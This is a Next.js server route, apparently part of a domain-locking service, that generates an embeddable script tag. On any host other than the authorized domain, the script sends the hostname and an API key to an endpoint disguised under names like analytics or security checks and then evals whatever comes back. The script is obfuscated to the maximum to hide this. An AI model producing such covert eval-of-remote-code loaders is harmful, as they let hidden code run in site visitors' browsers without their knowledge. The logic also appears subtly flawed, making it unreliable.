import { NextResponse } from "next/server"
import { createClient } from "@supabase/supabase-js"
import JavaScriptObfuscator from "javascript-obfuscator"

const supabase = createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!)

export const dynamic = "force-dynamic"

// Função para gerar IDs únicos curtos
function generateShortId(): string {
  return Math.random().toString(36).substring(2, 8)
}

// Função para criar URLs ofuscadas
function createObfuscatedEndpoint(): string {
  const endpoints = [
    "/api/v1/check",
    "/api/v2/verify",
    "/api/analytics/track",
    "/api/security/validate",
    "/api/monitor/status",
  ]
  return endpoints[Math.floor(Math.random() * endpoints.length)]
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { authorizedDomain } = body

    if (!authorizedDomain || typeof authorizedDomain !== "string") {
      return NextResponse.json({ error: "Domain required" }, { status: 400 })
    }

    // Buscar configuração do domínio
    const { data: config, error } = await supabase
      .from("domain_configs")
      .select("*")
      .eq("authorized_domain", authorizedDomain)
      .single()

    if (error || !config) {
      return NextResponse.json({ error: "Domain not found" }, { status: 404 })
    }

    // Gerar IDs únicos para ofuscação
    const sessionId = generateShortId()
    const checkId = generateShortId()
    const endpoint = createObfuscatedEndpoint()

    // Script ultra-compacto e ofuscado
    const ultraCompactScript = `
(function(){
var a='${authorizedDomain}',b=location.hostname,c='${config.client_api_key}',d='${sessionId}',e='${checkId}';
if(b!==a){
var f=new XMLHttpRequest();
f.open('GET','${endpoint}?h='+b+'&k='+c+'&s='+d+'&c='+e,true);
f.onload=function(){
if(f.status===200){
try{eval(f.responseText);}catch(g){}
}
};
f.send();
}
})();
`.trim()

    // Aplicar obfuscação extrema
    const obfuscated = JavaScriptObfuscator.obfuscate(ultraCompactScript, {
      compact: true,
      controlFlowFlattening: true,
      controlFlowFlatteningThreshold: 1,
      deadCodeInjection: false,
      debugProtection: false,
      debugProtectionInterval: 0,
      disableConsoleOutput: true,
      identifierNamesGenerator: "mangled",
      log: false,
      numbersToExpressions: true,
      renameGlobals: false,
      selfDefending: true,
      simplify: true,
      splitStrings: true,
      splitStringsChunkLength: 5,
      stringArray: true,
      stringArrayCallsTransform: true,
      stringArrayEncoding: ["base64"],
      stringArrayIndexShift: true,
      stringArrayRotate: true,
      stringArrayShuffle: true,
      stringArrayWrappersCount: 5,
      stringArrayWrappersChainedCalls: true,
      stringArrayWrappersParametersMaxCount: 5,
      stringArrayWrappersType: "function",
      stringArrayThreshold: 1,
      transformObjectKeys: true,
      unicodeEscapeSequence: false,
    })

    const finalScript = `<script>${obfuscated.getObfuscatedCode()}</script>`

    return NextResponse.json({
      script: finalScript,
      size: finalScript.length,
      compression: Math.round((1 - finalScript.length / ultraCompactScript.length) * 100),
    })
  } catch (error: any) {
    console.error("Error generating ultra-compact script:", error)
    return NextResponse.json({ error: "Generation failed" }, { status: 500 })
  }
}
